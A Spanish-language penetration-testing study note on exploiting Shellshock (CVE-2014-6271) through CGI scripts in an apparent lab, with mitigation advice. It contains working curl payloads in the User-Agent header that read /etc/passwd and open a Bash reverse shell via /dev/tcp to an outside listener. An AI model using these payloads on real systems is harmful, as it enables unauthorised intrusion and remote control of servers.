---
tags:
  - Web/Red-Team
  - CGI
  - Pentesting/Explotacion
Descripción: "Los scripts CGI (en /cgi-bin/, escritos en Perl, C, Bash…) corren en el contexto del servidor web (normalmente www-data)"
Fecha de actualización: 2026-07-16
Nota previa: "[[00 - Ataque a Tomcat CGI]]"
Nota siguiente: "[[00 - Ataque a thick clients]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

Los scripts CGI (en `/cgi-bin/`, escritos en Perl, C, Bash…) corren en el contexto del servidor web (normalmente `www-data`). <mark style="background: #ADCCFFA6;">Shellshock (**CVE-2014-6271**) es un fallo en **Bash** (≤ 4.3)</mark>: al importar una definición de función desde una variable de entorno, ejecuta el código que va **después**. Los scripts CGx que invocan Bash exponen las cabeceras HTTP como variables de entorno → command injection por cabecera.

# El fallo, en una línea

```shell-session
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
vulnerable-shellshock
not vulnerable
```

Bash interpreta `y='() { :;};'` como definición de función y —si es vulnerable— ejecuta lo que sigue. <mark style="background: #FFB8EBA6;">En un sistema parcheado solo imprime `not vulnerable`</mark> (y las funciones en variables deben prefijarse con `BASH_FUNC_`).

# Enumeración

```shell-session
$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
/access.cgi (Status: 200)
```

Un `curl` al script puede no devolver nada (parece defunto) pero sigue siendo explotable.

# Confirmar y explotar

La cabecera `User-Agent` (o `Referer`, `Cookie`) se refleja al entorno. Confirmar leyendo `/etc/passwd`:

```shell-session
$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://10.129.204.231/cgi-bin/access.cgi
root:x:0:0:root:/root:/bin/bash
...
```

Reverse shell:

```shell-session
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
# → nc -lvnp 7777  → www-data
```

# Mitigación

Actualizar Bash. En sistemas EOL puede requerir actualizar antes el gestor de paquetes; en **dispositivos IoT/embebidos** a veces no se puede → aislarlos de Internet o retirarlos (un firewall es solo un parche temporal).

> [!warning]+ Vigencia en 2026
> Shellshock es de 2014, pero <mark style="background: #FF5582A6;">sigue apareciendo en IoT, appliances viejos y sistemas legacy</mark> con CGI + Bash. Un foothold sencillo si encuentras `/cgi-bin/` en un objetivo así. Detección: `nmap --script http-shellshock`, `nuclei -tags shellshock`. Probar todas las cabeceras reflejadas contra cada script CGI.

Dejamos las apps web para las **aplicaciones de cliente pesado**: [[00 - Ataque a thick clients]].
